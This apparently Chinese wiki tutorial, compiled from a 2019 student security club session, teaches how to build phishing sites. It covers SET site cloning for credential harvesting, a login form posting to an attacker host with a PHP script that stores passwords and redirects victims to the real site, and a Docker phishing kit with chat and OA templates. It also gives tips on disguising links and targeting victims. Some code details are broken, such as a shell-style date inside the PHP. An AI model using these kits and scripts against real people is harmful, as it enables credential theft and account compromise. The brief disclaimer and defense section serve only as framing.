---
title: 钓鱼网站制作入门实战教程
description: 系统梳理钓鱼网站制作的三种入门级实战路径：Social-Engineer Toolkit 自动化克隆、手动 PHP 表单劫持凭证、Docker
  Compose 一键部署 fish-docker 靶场，附关键命令与防范提示。基于 0w1Club 2019-09-21 第三周「五分钟制作钓鱼网站」萌新培训预告及实战内容整理。
category: program-analysis
tags:
- 社会工程学
- 钓鱼网站
- SET工具
- Docker
- 网络钓鱼
- PHP
- 0w1Club
- 萌新培养
- 安全培训
date: 2019-09-21
updated: '2026-11-13'
---

## 概述

本页面整理自 0w1Club 2019 年第 3 周线下培训《五分钟制作钓鱼网站》的**预告公告**与**实战教学内容**。培训面向安全入门者（萌新），演示**钓鱼页面快速生成**的三条主流路径：

1. **SET 自动化克隆** —— 利用 `social-engineer-toolkit` 一键镜像目标站点
2. **手动 PHP 表单劫持** —— 抓包分析登录逻辑，改写 `action` 指向自建收集脚本
3. **Docker Compose 部署 fish-docker** —— 容器化一键拉起完整钓鱼靶场环境

> ⚠️ **仅供授权渗透测试与防御研究使用**，未经授权对真实目标实施钓鱼属违法行为。

---

## 培训预告背景（2019-09-21 第三周）

### 活动信息
- **时间**：2019-09-21（周六）21:40，持续约 1 小时
- **地点**：彭康楼（梧桐东门集合）
- **分享人**：夜晓
- **参考成品**：`ggalaxy.top:8090`（已下线，仅作历史记录）

### 赛前准备建议（原文摘录）
> ● 学习一些 PHP 和 HTML 的基础语法  
> ● 了解 Docker（注意区分 Docker 和虚拟机之间的差别），部署暂时不用掌握，果果已经将 Dockerfile 写好了  
> ● 从果果的 GitHub 上下载源码，分享会部署时需要用：  
> &nbsp;&nbsp;https://github.com/gwyxjtu/fish-docker  
> ● 搜集资料，了解一个网站的具体结构，前后端都是由什么组成的

### 参考资源
- **Docker 安装教程**：[nightmorning.site/wordpress/?p=351](https://nightmorning.site/wordpress/?p=351) （原链接，现可能不可访问）

---

## 方法一：SET 自动化克隆

### 环境准备
- Kali Linux 或已安装 Metasploit Framework 的 Linux 发行版
- 网络可达目标站点

### 安装 SET
```bash
git clone https://github.com/trustedsec/social-engineer-toolkit/set/
cd set
./setoolkit
```

### 交互式生成钓鱼页面
启动后依次选择菜单项（编号可能随版本变化，以功能名称为准）：

| 步骤 | 菜单路径 | 说明 |
|------|----------|------|
| 1 | `Social-Engineering Attacks` | 进入社工攻击模块 |
| 2 | `Website Attack Vectors` | 选择 Web 攻击向量 |
| 3 | `Credential Harvester Attack Method` | 凭证收集模式 |
| 4 | `Site Cloner` | 站点克隆器 |

随后按提示输入：
- **HOST IP**：监听地址（本地测试用 `127.0.0.1`，实战填公网/内网 IP）
- **目标 URL**：如 `http://0w1.space/login`

完成后访问监听地址即可看到克隆页面，受害者提交的凭证将实时显示在 SET 控制台。

---

## 方法二：手动 PHP 表单劫持

### 核心思路
1. **抓包分析** 正常登录流程，确认 `method="POST"` 及字段名（如 `username`、`password`）
2. **保存目标页面** 为本地 HTML，修改 `<form action="...">` 指向自建收集脚本
3. **编写 PHP 接收脚本** 落地凭证并跳回真实站点降低怀疑

### 关键代码片段

**修改后的登录表单（片段）**
```html
<form action="http://<ATTACKER_IP>/collect.php" method="POST">
  <input type="text" name="username" />
  <input type="password" name="password" />
  <input type="submit" value="登录" />
</form>
```

**collect.php（凭证落地 + 静默跳转）**
```php
<?php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
file_put_contents('creds.txt', "[$(date)] $user:$pass\n", FILE_APPEND);
// 可选：跳转回真实登录页或显示“密码错误”再跳转
header('Location: https://real-target.com/login?err=1');
exit;
?>
```

> 💡 实战中常结合 **短链接/域名伪装** 发送钓鱼链接，配合 `User-Agent` 判断仅对移动端/特定地区投放。

---

## 方法三：Docker Compose 一键部署 fish-docker 靶场

### 适用场景
- 团队内部钓鱼演练、红蓝对抗靶场搭建
- 需要完整前后端、数据库、日志审计的容器化环境

### 依赖安装
```bash
sudo apt-get update
sudo apt-get install docker.io docker-compose
# 若 apt 版本过旧，可改用官方脚本或 pip 安装 docker-compose
```

### 部署步骤
```bash
git clone https://github.com/gwyxjtu/fish-docker.git
cd fish-docker
docker-compose up -d
```

| 服务 | 端口 | 说明 |
|------|------|------|
| Web 前端 | 8090 | 钓鱼页面入口 |
| API/后端 | 8091 | 接收凭证、管理面板 |
| MySQL | 3306 | 存储凭证与配置 |

访问 `http://<HOST>:8090` 即可看到预置钓鱼模板（微信、QQ、OA 等）。

### 清理环境（良好习惯）
```bash
docker-compose down   # 停止并移除容器、网络
# 如需彻底清理数据卷
docker-compose down -v
```

---

## 关键命令速查表

| 场景 | 命令 |
|------|------|
| 启动 SET | `cd set && ./setoolkit` |
| 克隆站点（非交互） | `setoolkit -c "set:webattack:2:3:2" -o "IP=<LHOST>,URL=<TARGET>"` |
| 仅拉取 fish-docker 镜像 | `docker-compose pull` |
| 查看容器日志 | `docker-compose logs -f web` |
| 导出凭证文件 | `docker cp fish_web_1:/var/www/html/creds.txt ./` |

---

## 防范与检测建议

1. **安全意识培训** —— 定期发送模拟钓鱼邮件，统计点击/提交率并复盘
2. **技术层面**
   - 部署 **DMARC/SPF/DKIM** 防止域名伪造
   - 网关/邮件网关集成 **URL 沙箱扫描** 与 **威胁情报** 拦截已知钓鱼域名
   - 终端 EDR 监控浏览器进程异常网络连接、自签名证书访问
3. **应急响应**
   - 发现凭证泄露立即强制重置、启用 MFA
   - 保留钓鱼页面快照、HTTP 日志、DNS 解析记录用于溯源

---

## 关联页面

- [[0w1club-wechat-archive-201908-202207]] —— 0w1Club 微信归档总索引，含本文原始发布记录
- [[reverse-engineering-beginner-learning-path]] —— 逆向工程入门路线，了解客户端钓鱼样本分析基础
- [[rop-linux-x86-beginner-tutorial]] —— 二进制利用基础，理解钓鱼载荷落地后的后利用阶段

---

## 版本历史

| 日期 | 版本 | 变更说明 |
|------|------|----------|
| 2019-09-21 | 1.0 | 初始整理，对应 0w1Club 第三周培训预告及实战内容 |
| 2026-11-13 | 1.1 | 补充培训预告原文细节、GitHub 仓库地址、赛前准备建议及参考链接 |

## 来源

- [0w1Club-201908-202207_19](../sources/0w1Club-201908-202207_19.md)
- [0w1Club-201908-202207_21](../sources/0w1Club-201908-202207_21.md)
